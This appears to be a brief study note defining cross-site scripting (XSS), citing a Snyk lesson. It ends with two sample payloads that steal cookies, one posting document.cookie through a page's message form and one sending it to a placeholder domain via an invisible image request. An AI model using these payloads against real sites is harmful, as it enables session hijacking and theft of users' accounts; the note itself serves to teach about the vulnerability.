## $\textnormal{What is XSS?}$

```plaintext
https://learn.snyk.io/lesson/xss/
```

> - `Cross-site Scripting (XSS)` is a code vulnerability that occurs <br />
    when an attacker `injects` a malicious script into an otherwise <br />
    trusted website.

> - The injected script gets downloaded and executed by the end <br />
    user’s browser when the user interacts with the compromised website.

> - Since the script came from a trusted website, it cannot be <br />
    distinguished from a legitimate script.

```typescript
// Sample XSS attack that get the cookies.
<script>document.getElementById("messageText").innerHTML=document.cookie;document.getElementById("sendMessage").click();</script>

// This script constructs an invisible image object which calls the provided src URL the moment the image is created.
// Effectively, we issue an HTTP request with the cookie’s content in the URL to a domain of our choice.
<script>new Image().src="http://yourdomain.io/"+document.cookie;</script>
```
